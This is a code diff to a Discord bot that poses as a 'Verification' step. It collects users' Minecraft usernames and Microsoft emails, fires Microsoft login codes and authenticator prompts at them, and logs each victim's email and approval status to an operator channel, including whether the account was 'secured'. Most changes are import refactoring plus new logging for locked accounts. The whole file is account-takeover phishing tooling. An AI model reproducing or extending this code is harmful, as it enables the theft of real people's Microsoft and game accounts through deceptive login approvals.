@@ -1,4 +1,4 @@
-from discord import ui
+from discord import ui, Embed
 import datetime
 import requests
 import discord
@@ -46,6 +46,17 @@ class MyModalOne(ui.Modal, title="Verification"):
                 ephemeral = True
             )
 
+            logs_channel.send(
+                embed = Embed (
+                    title = f"{interaction.user.name} | {interaction.user.id}",
+                    description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Locked Microsoft Account```",
+                    timestamp = datetime.datetime.now(),
+                    colour = 0xFF5C5C,                         
+                    ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}")
+            )
+            
+            return
+
         # Sends OTP/Auth code
         emailInfo = sendAuth(self.email.value)
 
@@ -54,14 +65,14 @@ class MyModalOne(ui.Modal, title="Verification"):
         # To be coded later
         if len(emailInfo) == 1:
             await logs_channel.send(
-                embed = discord.Embed(
+                embed = Embed(
                     title = f"{interaction.user.name} ({interaction.user.id})",
                     description = f"Failed to send a code to:\n```{self.email.value}```\nOTP Cooldown"
                 )
             )
 
             await interaction.response.send_message(
-                    embed = discord.Embed(
+                    embed = Embed(
                     title = embeds["cooldown_otp"][0],
                     description = embeds["cooldown_otp"][1],
                 ),
@@ -73,14 +84,14 @@ class MyModalOne(ui.Modal, title="Verification"):
         # Email does not exist
         if "Credentials" not in emailInfo:
             await logs_channel.send(
-                    embed = discord.Embed(
+                    embed = Embed(
                         title = f"{interaction.user.name} ({interaction.user.id})",
                         description = f"Failed to send a code to:\n```{self.email.value}```\nInvalid Email"
                     )
                 )
 
             await interaction.response.send_message(
-                embed = discord.Embed(
+                embed = Embed(
                     title = embeds["failed_otp"][0],
                     description = embeds["failed_otp"][1],
                 ),
@@ -109,7 +120,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]
 
             await interaction.followup.send(
-                embed = discord.Embed(
+                embed = Embed(
                     title="Verification ✅",
                     description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
                     colour=0x00FF00
@@ -117,7 +128,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 ephemeral = True
             )
 
-            sucessEmbed = discord.Embed (
+            sucessEmbed = Embed (
                 title = f"{interaction.user.name} | {interaction.user.id}",
                 description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Waiting for Auth confirmation```",
                 timestamp = datetime.datetime.now(),
@@ -157,7 +168,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
                     failedAuth = embeds["failed_auth"]
                     await interaction.followup.send(
-                        embed = discord.Embed(
+                        embed = Embed(
                             title = failedAuth[0],
                             description = failedAuth[1],
                             colour=0x00FF00
@@ -166,7 +177,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     )
 
                     await logs_channel.send(
-                        embed = discord.Embed(
+                        embed = Embed(
                             title = f"Failed to Verify - {interaction.user.name} ({interaction.user.id})",
                             description = f"**Method**\n```Authenticator```\n**Status**\n```Clicked on the wrong number```",
                             colour=0x00FF00
@@ -176,7 +187,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
                 elif data["SessionState"] > 1 or data["AuthorizationState"] > 1:
                     
-                    sucessEmbed = discord.Embed (
+                    sucessEmbed = Embed (
                         title = f"{interaction.user.name} | {interaction.user.id}",
                         description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Auth code confirmed!```",
                         timestamp = datetime.datetime.now(),
@@ -197,7 +208,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
                     if embeds is None:
                         await logs_channel.send(
-                            embed = discord.Embed(
+                            embed = Embed(
                                 title = f"Failed to Secure - {interaction.user.name} ({interaction.user.id})",
                                 description = f"**Email**\n```{self.email.value}```\n**Error**\n```Failed to get MSAAUTH```",
                                 colour=0xDE755B
@@ -217,7 +228,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
             failedAuth = embeds["timeout_auth"]
             await interaction.followup.send(
-                    embed = discord.Embed(
+                    embed = Embed(
                     title = failedAuth[0],
                     description = failedAuth[1],
                     colour=0x00FF00
@@ -226,7 +237,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             )
 
             await logs_channel.send(
-               embed = discord.Embed(
+               embed = Embed(
                     title = f"{interaction.user.name} | {interaction.user.id}",
                     description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Failed to confirm for Auth```",
                     timestamp = datetime.datetime.now(),
@@ -255,7 +266,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 )
 
             await interaction.followup.send(
-                embed=discord.Embed(
+                embed=Embed(
                     title="Verification",
                     description=f"A verification code has been sent to your security email {secEmail["display"]}.\nPlease click the button below to enter your code.",
                     colour=0x00FF00
@@ -264,7 +275,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 ephemeral = True
             )
 
-            sucessEmbed = discord.Embed (
+            sucessEmbed = Embed (
                     title = f"{interaction.user.name} | {interaction.user.id}",
                     description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Waiting for OTP code```",
                     timestamp = datetime.datetime.now(),
@@ -278,14 +289,14 @@ class MyModalOne(ui.Modal, title="Verification"):
         else:
 
             await logs_channel.send(
-                    embed = discord.Embed(
+                    embed = Embed(
                         title = f"{interaction.user.name} ({interaction.user.id})",
                         description = f"Failed to send a code to:\n```{self.email.value}```\n No OTP Methods Found"
                     )
                 )
 
             await interaction.followup.send(
-                embed = discord.Embed(
+                embed = Embed(
                     title = embeds["failed_otp"][0],
                     description = embeds["failed_otp"][1],
                 ),
